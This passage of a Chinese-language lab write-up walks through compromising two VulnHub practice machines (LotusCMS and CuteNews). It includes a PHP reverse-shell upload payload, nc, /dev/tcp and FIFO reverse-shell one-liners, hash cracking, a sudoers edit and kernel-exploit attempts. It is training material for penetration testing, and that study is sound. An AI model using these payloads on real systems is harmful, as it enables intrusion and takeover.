+<h2 id="web-渗透-1"><a href="#web-渗透-1" class="headerlink" title="web 渗透"></a>web 渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921504.png" alt="image-20251213185618044"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921505.png" alt="image-20251213185714523"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921506.png" alt="image-20251213185732666"></p>
+<h3 id="文件包含尝试"><a href="#文件包含尝试" class="headerlink" title="文件包含尝试"></a>文件包含尝试</h3><p><code>login</code> 界面是登录后台页</p>
+<p><strong>看</strong><code>url</code> 很像有文件包含漏洞，拿到 kali 用 curl 试一下—–没有成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921507.png" alt="image-20251213190013026"></p>
+<h3 id="目录爆破-1"><a href="#目录爆破-1" class="headerlink" title="目录爆破"></a>目录爆破</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921508.png" alt="image-20251213190314423"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gobuster dir -u http://192.168.95.132 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+
+<p><code>/gallery</code> web 页面上多次告诉我们这是一个画廊，比较重要</p>
+<p><code>/phpmyadmin</code> 也非常重要</p>
+<h3 id="内容管理系统-Lotus-CMS-的泄漏"><a href="#内容管理系统-Lotus-CMS-的泄漏" class="headerlink" title="内容管理系统 Lotus CMS 的泄漏"></a>内容管理系统 Lotus CMS 的泄漏</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921506.png" alt="image-20251213185732666"></p>
+<p><strong>登录框中告诉了我们****用户管理系统</strong>是**<code>LotusCMS</code>**</p>
+<h2 id="Lotus-CMS-的漏洞利用"><a href="#Lotus-CMS-的漏洞利用" class="headerlink" title="Lotus CMS 的漏洞利用"></a>Lotus CMS 的漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit LotusCMS</span><br><span class="line">searchsploit LotusCMS -m 16982.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921510.png" alt="image-20251213190840160"></p>
+<p><strong>先不用 metasploit；看看第二个，里面包含多个漏洞，找方便利用的</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921511.png" alt="image-20251213191151658"></p>
+<p><strong>发现都是 CSRF 和 XSS 的，不是特别简单的利用，再搜索引擎试试看 Google–github</strong></p>
+<p>**github 上搜索 **<code>lotus exploit</code> 发现一个 RCE，还是 sh 的脚本，可以很快的试一下能不能利用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921512.png" alt="image-20251213191452853"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921513.png" alt="image-20251213191556910"></p>
+<p><strong>使用方法</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921514.png" alt="image-20251213191738205"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921515.png" alt="image-20251213191921797"></p>
+<p>**                                                                            **<code>.sh        ip     lotuscms所在位置是根目录</code></p>
+<p><strong>回车以后，问我们要“用哪个 IP 接收反弹 shell”，“用哪个端口反弹”，“如何反弹 shell”</strong></p>
+<p><strong>我们先打开监听，再进行使用脚本</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921516.png" alt="image-20251213192630805"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921517.png" alt="image-20251213192650586"></p>
+<p><strong>发现监听有反应，反弹 shell 成功。虽然交互性不是很好，但是有装 python</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921518.png" alt="image-20251213192909286"></p>
+<h3 id="提高-shell-交互性，python-和-TERM-环境变量设置"><a href="#提高-shell-交互性，python-和-TERM-环境变量设置" class="headerlink" title="提高 shell 交互性，python 和 TERM 环境变量设置"></a>提高 shell 交互性，python 和 TERM 环境变量设置</h3><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p><code>export TERM=xterm-color</code></p>
+<blockquote>
+<p><code>export TERM=xterm-color</code> 是 Linux&#x2F;Unix 中<strong>设置并导出终端类型环境变量</strong>的命令，核心是告诉系统：当前终端模拟器（Terminal Emulator）兼容 <code>xterm-color</code> 类型 —— 支持彩色输出、光标移动、终端尺寸调整等高级功能，解决 “终端无颜色 &#x2F; 交互异常” 问题。<strong>这里其实只要给他个能用的就行，是什么无所谓</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921519.png" alt="image-20251213193100277"></p>
+<h3 id="配置文件找登录密码"><a href="#配置文件找登录密码" class="headerlink" title="配置文件找登录密码"></a>配置文件找登录密码</h3><p><strong>CMS 最重要的是能否找到他的****配置文件</strong>，里面可能有用户凭据，可以<strong>密码复用</strong>，也可以<strong>登录数据库</strong></p>
+<p><strong>在 gallery 目录中，这些都是我们感兴趣的，上面两个需要密码，那就看</strong><code>gconfig.php</code> 的配置文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921520.png" alt="image-20251213194312674"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921521.png" alt="image-20251213194447620"></p>
+<p><strong>先尝试密码复用，登录 root 用户，登录失败</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921522.png" alt="image-20251213194621154"></p>
+<p><strong>登录 mysql，肯定可以进入，因为这是运行中的 CMS 的配置文件</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921523.png" alt="image-20251213194939821"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921524.png" alt="image-20251213195038091"></p>
+<h4 id="第一组可以登录-gallery"><a href="#第一组可以登录-gallery" class="headerlink" title="第一组可以登录 gallery"></a>第一组可以登录 <code>gallery</code></h4><p><strong>这里的</strong><code>gallarific</code> 其实是个<strong>插件</strong>类型的东西？可以尝试 sql 注入，网上也有利用方式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921525.png" alt="image-20251213203623149"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921526.png" alt="image-20251213195318142"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921527.png" alt="image-20251213195426332"></p>
+<h4 id="爆破第二组密码-hash"><a href="#爆破第二组密码-hash" class="headerlink" title="爆破第二组密码 hash"></a>爆破第二组密码 hash</h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921528.png" alt="image-20251213200419651"></p>
+<p><code>hash-identifier</code> 确认 hash 类型**	**MD5</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921529.png" alt="image-20251213195841166"></p>
+<p><code>john</code> 破解 hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo gunzip /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921530.png" alt="image-20251213195944546"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921531.png" alt="image-20251213200129911"></p>
+<h2 id="配置文件泄漏数据库密码，获得初步提权"><a href="#配置文件泄漏数据库密码，获得初步提权" class="headerlink" title="配置文件泄漏数据库密码，获得初步提权"></a>配置文件泄漏数据库密码，获得初步提权</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921532.png" alt="image-20251213200246521"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921533.png" alt="image-20251213200439805"></p>
+<p><code>ht</code> 是一个编辑器，类似 <code>vim</code>，可以 sudo？确实是这样**	**</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921534.png" alt="image-20251213200700454"></p>
+<p><code>sudo /usr/local/bin/ht</code> 启动这个编辑器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921535.png" alt="image-20251213200822091"></p>
+<p><strong>这个编辑器有 root 权限，可以修改 sudoer 里面的内容，</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921536.png" alt="image-20251213201309984"> 右上角打开文件<img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921537.png" alt="image-20251213201357498"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921538.png" alt="image-20251213201457217"></p>
+<p><strong>修改</strong><code>sudoer</code> 的内容，让我们可以无密码以 root 权限启动 <code>/bin/bash</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921539.png" alt="image-20251213201618288"></p>
+<h2 id="获得-root-权限"><a href="#获得-root-权限" class="headerlink" title="获得 root 权限"></a>获得 root 权限</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921540.png" alt="image-20251213201706384"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921541.png" alt="image-20251213201734454"></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p><strong>感谢师傅的视频，这台靶机还可以利用 gallarific 的****SQL 注入</strong>获取到用户（毕竟可以上传图片之类的），最开始打的时候没注意 gallarific 是个软件，以为作者自己开发的，那 bp 做 FUZZ 的时候也找到了注入点，反思一下，确实先入为主以为 gallarific 可能是拼错了（gallerific），但是不看 wp 找到注入点，全靠师傅之前视频的 SQL 注入学的。</p>
+<h3 id="思维导图-1"><a href="#思维导图-1" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921542.png" alt="image-20251213202722804"></p>
+<h3 id="NetCat-即-nc"><a href="#NetCat-即-nc" class="headerlink" title="NetCat 即 nc"></a>NetCat 即 nc</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921516.png" alt="image-20251213192630805"></p>
+<p><strong>脚本中这几个都是指的什么，下面是解释</strong></p>
+<h3 id="一、NetCat-e（执行命令，反向-正向-Shell-核心）"><a href="#一、NetCat-e（执行命令，反向-正向-Shell-核心）" class="headerlink" title="一、NetCat -e（执行命令，反向 &#x2F; 正向 Shell 核心）"></a>一、NetCat -e（执行命令，反向 &#x2F; 正向 Shell 核心）</h3><h4 id="1-作用"><a href="#1-作用" class="headerlink" title="1. 作用"></a>1. 作用</h4><p><code>-e</code> 是 NetCat（nc）的<strong>执行参数</strong>，核心功能是 “将网络连接与指定命令 &#x2F; 程序的标准输入 &#x2F; 输出绑定”—— 当 nc 建立网络连接后，自动执行指定命令，且命令的输入 &#x2F; 输出 &#x2F; 错误流全部重定向到网络套接字，是实现<strong>正向 Shell &#x2F; 反向 Shell</strong> 的关键参数。</p>
+<h4 id="2-语法与场景"><a href="#2-语法与场景" class="headerlink" title="2. 语法与场景"></a>2. 语法与场景</h4><table>
+<thead>
+<tr>
+<th><strong>用法</strong></th>
+<th><strong>类型</strong></th>
+<th><strong>示例（Kali 攻击机 IP：192.168.1.100，端口 443）</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>正向 Shell（目标机）</strong></td>
+<td><strong>目标机监听</strong></td>
+<td><code>nc -lvp 443 -e /bin/bash</code>（目标机监听 443 端口，攻击者连接后直接获取 bash）</td>
+</tr>
+<tr>
+<td><strong>反向 Shell（目标机）</strong></td>
+<td><strong>目标机主动连接</strong></td>
+<td><code>nc 192.168.1.100 443 -e /bin/bash</code>（目标机主动连接攻击机，绑定 bash 到连接）</td>
+</tr>
+</tbody></table>
+<h4 id="3-关键说明"><a href="#3-关键说明" class="headerlink" title="3. 关键说明"></a>3. 关键说明</h4><ul>
+<li>**权限：执行 **<code>-e</code> 需要目标机 nc 支持该参数（部分系统为了安全，编译时禁用了 <code>-e</code>，如默认的 macOS &#x2F; 部分 Linux 发行版）；</li>
+<li>**风险：红队渗透中最常用的提权 &#x2F; 控制手段，蓝队需监控含 **<code>-e</code> 的 nc 命令；</li>
+<li>**替代：若 **<code>-e</code> 被禁用，需用后文的 FIFO&#x2F;Backpipe 绕过。</li>
+</ul>
+<h3 id="二、NetCat-dev-tcp（伪设备，无-nc-二进制时的替代方案）"><a href="#二、NetCat-dev-tcp（伪设备，无-nc-二进制时的替代方案）" class="headerlink" title="二、NetCat &#x2F;dev&#x2F;tcp（伪设备，无 nc 二进制时的替代方案）"></a>二、NetCat &#x2F;dev&#x2F;tcp（伪设备，无 nc 二进制时的替代方案）</h3><h4 id="1-作用-1"><a href="#1-作用-1" class="headerlink" title="1. 作用"></a>1. 作用</h4><p><code>/dev/tcp</code> 是 Linux Bash 内置的<strong>伪设备文件</strong>（并非真实设备），核心功能是 “通过文件操作模拟 TCP 网络连接”—— 无需安装 nc 二进制文件，直接通过 Bash 重定向即可实现网络通信，是 nc 被禁用时的经典绕过手段。</p>
+<h4 id="2-原理"><a href="#2-原理" class="headerlink" title="2. 原理"></a>2. 原理</h4><p>**Bash 会将 **<code>/dev/tcp/目标IP/端口</code> 解析为 TCP 套接字，对该文件的读写等价于通过 TCP 连接发送 &#x2F; 接收数据，无需依赖 nc 程序。</p>
+<h4 id="3-典型用法（反向-Shell）"><a href="#3-典型用法（反向-Shell）" class="headerlink" title="3. 典型用法（反向 Shell）"></a>3. 典型用法（反向 Shell）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 目标机执行：连接攻击机443端口，绑定bash到连接</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.100/443 0&gt;&amp;1</span><br><span class="line"># 拆解：</span><br><span class="line"># bash -i：交互式bash</span><br><span class="line"># &gt;&amp; /dev/tcp/...：将stdout/stderr重定向到TCP连接</span><br><span class="line"># 0&gt;&amp;1：将stdin重定向到stdout（即TCP连接），实现双向交互</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-关键说明"><a href="#4-关键说明" class="headerlink" title="4. 关键说明"></a>4. 关键说明</h4><ul>
+<li><strong>仅依赖 Bash：无需 nc、socat 等工具，只要目标机有 Bash 即可使用；</strong></li>
+<li><strong>隐蔽性：无二进制执行痕迹，易绕过基础检测；</strong></li>
+<li>**限制：仅支持 Bash（sh&#x2F;zsh 等可能不兼容 **<code>/dev/tcp</code>）。</li>
+</ul>
+<h3 id="三、NetCat-Backpipe（命名管道，绕过-e-禁用）"><a href="#三、NetCat-Backpipe（命名管道，绕过-e-禁用）" class="headerlink" title="三、NetCat Backpipe（命名管道，绕过 - e 禁用）"></a>三、NetCat Backpipe（命名管道，绕过 - e 禁用）</h3><h4 id="1-作用-2"><a href="#1-作用-2" class="headerlink" title="1. 作用"></a>1. 作用</h4><p><strong>“Backpipe”（反向管道）是****临时命名管道</strong>的俗称，核心是通过创建 FIFO（命名管道）文件，手动实现 “网络连接与 Shell 的输入输出绑定”—— 当 nc 禁用 <code>-e</code> 参数时，用管道替代 <code>-e</code> 的功能。</p>
+<h4 id="2-原理-1"><a href="#2-原理-1" class="headerlink" title="2. 原理"></a>2. 原理</h4><p>**通过 **<code>mkfifo</code> 创建命名管道（如 <code>backpipe</code>），将 nc 的网络输出定向到管道，管道内容作为 Shell 的输入；同时 Shell 的输出定向回 nc 的网络输入，形成双向通信。</p>
+<h4 id="3-典型用法（反向-Shell）-1"><a href="#3-典型用法（反向-Shell）-1" class="headerlink" title="3. 典型用法（反向 Shell）"></a>3. 典型用法（反向 Shell）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 目标机执行：</span><br><span class="line">1. mkfifo backpipe  # 创建命名管道</span><br><span class="line">2. nc 192.168.1.100 443 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br><span class="line"># 拆解：</span><br><span class="line"># 0&lt;backpipe：nc的stdin读取backpipe管道内容（即bash的输出）</span><br><span class="line"># | /bin/bash：nc的stdout作为bash的stdin（即攻击者输入的命令）</span><br><span class="line"># 1&gt;backpipe 2&gt;backpipe：bash的stdout/stderr写入backpipe，回传给nc</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-关键说明-1"><a href="#4-关键说明-1" class="headerlink" title="4. 关键说明"></a>4. 关键说明</h4><ul>
+<li>**绕过 **<code>-e</code> 禁用：无需 nc 的 <code>-e</code> 参数，纯管道实现 Shell 绑定；</li>
+<li>**临时文件：用完可删除 **<code>rm backpipe</code>，隐蔽性较好；</li>
+<li><strong>兼容性：所有支持 FIFO 的 Linux&#x2F;Unix 系统均可使用。</strong></li>
+</ul>
+<h3 id="四、NetCat-FIFO（命名管道，与-Backpipe-等价）"><a href="#四、NetCat-FIFO（命名管道，与-Backpipe-等价）" class="headerlink" title="四、NetCat FIFO（命名管道，与 Backpipe 等价）"></a>四、NetCat FIFO（命名管道，与 Backpipe 等价）</h3><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h4><p><strong>FIFO（First In First Out）即****命名管道</strong>，是 Linux&#x2F;Unix 的一种特殊文件（类型标识为 <code>p</code>），本质是 “基于文件系统的管道”，可在不同进程间传递数据 —— 前文的 “Backpipe” 就是 FIFO 的具体应用，二者是 “概念（FIFO）+ 实操（Backpipe）” 的关系。</p>
+<h4 id="2-核心区别（FIFO-vs-匿名管道）"><a href="#2-核心区别（FIFO-vs-匿名管道）" class="headerlink" title="2. 核心区别（FIFO vs 匿名管道）"></a>2. 核心区别（FIFO vs 匿名管道）</h4><ul>
+<li><strong>匿名管道（</strong><code>|</code>）：仅在父子进程间临时存在，生命周期随进程结束；</li>
+<li>**FIFO（命名管道）：以文件形式存在于文件系统（如 **<code>ls -l</code> 显示 <code>prw-r--r--</code>），可在任意进程间通信，手动删除前一直存在。</li>
+</ul>
+<h4 id="3-扩展用法（正向-Shell）"><a href="#3-扩展用法（正向-Shell）" class="headerlink" title="3. 扩展用法（正向 Shell）"></a>3. 扩展用法（正向 Shell）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 目标机执行：</span><br><span class="line">1. mkfifo /tmp/fifo  # 创建FIFO文件</span><br><span class="line">2. cat /tmp/fifo | /bin/bash -i &gt; /tmp/fifo 2&gt;&amp;1  # bash绑定FIFO</span><br><span class="line">3. nc -lvp 443 &lt; /tmp/fifo  # nc监听端口，读取FIFO内容（即bash输出）</span><br><span class="line"># 攻击者执行：nc 目标IP 443 → 即可输入命令控制目标机</span><br></pre></td></tr></table></figure>
+
+<h3 id="五、核心总结（红队视角）"><a href="#五、核心总结（红队视角）" class="headerlink" title="五、核心总结（红队视角）"></a>五、核心总结（红队视角）</h3><table>
+<thead>
+<tr>
+<th><strong>用法</strong></th>
+<th><strong>核心场景</strong></th>
+<th><strong>优势</strong></th>
+<th><strong>限制</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>nc -e</strong></td>
+<td><strong>有 - e 权限的正向 &#x2F; 反向 Shell</strong></td>
+<td><strong>简单直接，一行命令</strong></td>
+<td><strong>易被禁用，检测特征明显</strong></td>
+</tr>
+<tr>
+<td><strong>&#x2F;dev&#x2F;tcp</strong></td>
+<td><strong>无 nc 二进制时的反向 Shell</strong></td>
+<td><strong>仅依赖 Bash，无二进制</strong></td>
+<td><strong>仅支持 Bash</strong></td>
+</tr>
+<tr>
+<td><strong>Backpipe&#x2F;FIFO</strong></td>
+<td><strong>禁用 - e 时的 Shell 绕过</strong></td>
+<td><strong>兼容所有 nc 版本</strong></td>
+<td><strong>需创建临时文件，略复杂</strong></td>
+</tr>
+</tbody></table>
+<h1 id="BNE0x03Simple-内核提权"><a href="#BNE0x03Simple-内核提权" class="headerlink" title="BNE0x03Simple - 内核提权"></a>BNE0x03Simple - 内核提权</h1><h2 id="nmap-扫描-2"><a href="#nmap-扫描-2" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><p><strong>靶机精讲之 BNE0x03Simple，CuteCMS2.0.3 公开漏洞利用，超贴心的利用文件，将标准化的挖洞和渗透过程，几乎以手把手的方式教给你。内核提权本次靶机演示遇到了很多问题，小小的翻车现场，也是真实渗透内核提权过程的展现，面对现实，汲取教训。很容易的一台机器，但也很有思考的价值，想边看视频边操作的，可以到 vulnhub.com 下载靶机虚拟机文件。红队笔记和你一起进步。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.10.10.0/24</span><br><span class="line">sudo nmap --min-rate 1000 -p- ip</span><br><span class="line">sudo nmap -sU --min-rate -p- ip</span><br><span class="line">sudo nmap -sT -sV -sC -O -p,,, ip</span><br><span class="line">sudo nmap --script=vuln -p,,, ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921543.png" alt="image-20251222192541213"></p>
+<p><strong>靶机 IP：192.168.95.130</strong></p>
+<p><strong><code>CuteNews</code> 的内容管理系统</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921544.png" alt="image-20251222193620945"></p>
+<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921545.png" alt="image-20251222192700746"></p>
+<p><strong>思路：注入漏洞，目录爆破，版本号查漏洞</strong></p>
+<p><strong>由于版本号给的太明确了，直接查相关漏洞</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit CuteNews 2.0.3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921546.png" alt="image-20251222192841555"></p>
+<p><strong>发现有任意文件上传漏洞，那我们就可以上传反弹 shell 的脚本了</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit CuteNews 2.0.3 -m 37474    #下载</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921547.png" alt="image-20251222193241560"></p>
+<h2 id="CuteNews-CMS-的漏洞利用"><a href="#CuteNews-CMS-的漏洞利用" class="headerlink" title="CuteNews CMS 的漏洞利用"></a>CuteNews CMS 的漏洞利用</h2><p><strong>注册</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921548.png" alt="image-20251222193653288"></p>
+<p><strong>登录</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921550.png" alt="image-20251222193758249"></p>
+<p><strong>进入 Personal options 个人设置</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921551.png" alt="image-20251222193938623"></p>
+<p><strong>构造反弹 shell</strong>	<code>evil.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/kaliIP/port 0&gt;&amp;1&#x27;&quot;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921552.png" alt="image-20251222194114092"></p>
+<p><strong>直接上传</strong><code>evil.php</code> 成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921553.png" alt="image-20251222194345449"></p>
+<p><strong>上传位置</strong>	<strong>利用 txt 都说了</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921554.png" alt="image-20251222194549164"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921555.png" alt="image-20251222194522079"></p>
+<p><strong>其实这个漏洞本身就算比较简单</strong></p>
+<h2 id="获得初始-shell"><a href="#获得初始-shell" class="headerlink" title="获得初始 shell"></a>获得初始 shell</h2><p>**kali 监听 **<code>sudo nc -lvnp 1234</code></p>
+<p><strong>点击上传的 php 文件即可</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921556.png" alt="image-20251222194714186"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921557.png" alt="image-20251222194855636"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921558.png" alt="image-20251222195018921"></p>
+<blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p><strong>错误原因</strong></p>
+<p><code>sudo</code> 需要终端（tty）来提示输入密码，但在非交互式环境下：</p>
+<ol>
+<li><strong>没有可用的终端</strong></li>
+<li>**没有配置 **<code>askpass</code> 程序来自动提供密码</li>
+</ol>
+<p>**优先使用 **<strong>python pty</strong> 或 <strong>升级 shell</strong> 的方法解决。</p>
+<p><strong>下面的都可以****尝试</strong></p>
+</blockquote>
+<blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921559.png" alt="image-20251222195311740"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921560.png" alt="image-20251222195500336"></p>
+</blockquote>
+<h2 id="内核提权的尝试"><a href="#内核提权的尝试" class="headerlink" title="内核提权的尝试"></a>内核提权的尝试</h2><p><strong>现在我们尝试内核提权</strong>	<code>searchsploit kernel 3.16.0-30</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921561.png" alt="image-20251222200256685"></p>
+<p><strong>先试试这两个</strong></p>
+<h3 id="37292-c"><a href="#37292-c" class="headerlink" title="37292.c"></a>37292.c</h3><p><code>-m</code> 下载</p>
+<p>**kali 搭建简单的 web 服务器 **<code>sudo php -S 0:80</code></p>
+<p><strong>靶机下载</strong>	<code>wget http://kaliIP/37292.c</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921562.png" alt="image-20251222200651966"></p>
+<p><strong>使用就是编译并执行</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921563.png" alt="image-20251222200804754"></p>
+<p><strong>这里显示利用失败</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921564.png" alt="image-20251222200847398"></p>
+<h3 id="看一下-linpeas-sh-的建议"><a href="#看一下-linpeas-sh-的建议" class="headerlink" title="看一下 linpeas.sh 的建议"></a>看一下 <code>linpeas.sh</code> 的建议</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921565.png" alt="image-20251222201219611"></p>
+<p><strong>试试第一个</strong><code>dirtycow</code> 40611</p>
+<p><strong>usage</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921566.png" alt="image-20251222201443237"></p>
+<p><strong>利用失败</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921567.png" alt="image-20251222201534555"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921568.png" alt="image-20251222201625156"></p>
+<h2 id="Apport-AbrtApport-Abrt-提权成功"><a href="#Apport-AbrtApport-Abrt-提权成功" class="headerlink" title="Apport&#x2F;AbrtApport&#x2F;Abrt 提权成功"></a>Apport&#x2F;AbrtApport&#x2F;Abrt 提权成功</h2><blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p><strong>如何定位到 Apport 的？</strong></p>
+<p><strong>那就换一个思路找****ubuntu14</strong> 的漏洞，查询尝试后还不行但是发现 ubuntu 里有关于 <strong>Apport</strong> 的再进行搜索 apport 的尝试</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921569.png" alt="image-20251222201840117"></p>
+<p><strong>usage 只是告诉你了必须用</strong><code>static</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921570.png" alt="image-20251222202029165"></p>
